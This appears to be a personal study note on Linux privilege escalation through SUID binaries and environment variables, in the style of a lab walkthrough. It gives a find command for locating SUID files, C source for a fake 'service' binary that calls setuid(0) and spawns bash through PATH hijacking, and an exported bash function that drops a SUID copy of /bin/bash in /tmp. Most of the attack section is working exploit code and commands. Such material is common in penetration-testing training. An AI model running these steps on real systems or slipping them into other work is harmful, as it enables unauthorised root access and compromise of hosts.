Enviromental variables --> system wide variables used by shells,child process

**env**

**PART 1** 

if we do  
`find  / -type f -perm -04000 -ls 2>/dev/null`


![](/Linux-Privilege-Notes/images/suid_mew.png)
 lets say we find  **/usr/local/bin/suid-env**
 
 
 
 binary if we what it does we found that it is actually starting a apache service  as below 

![](/Linux-Privilege-Notes/images/suid_new.png)


Exploitation 

what if we can insert malicious service  instead of original one 

we create a file called service.c 

int main() {
 setgid(0); 
 setuid(0) ; 
 system("/bin/bash"); 
 return 0 ;
}

then compile the binary 

using 

gcc service.c -o service 

add the service to our PATH by 


**export PATH=/tmp:$PATH** 



then run the SUID  **/usr/local/bin/suid-env**




**PART 2**


![](/Linux-Privilege-Notes/images/suid_new_1.png)

what if the SUID is calling the full path 

create a malicious function for the full path 

"
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s  /tmp/bash && /tmp/bash -p;}

"

then export the service 
using 

**export -f /usr/sbin/service**


run the binaries 

**/usr/local/bin/suid-env2**



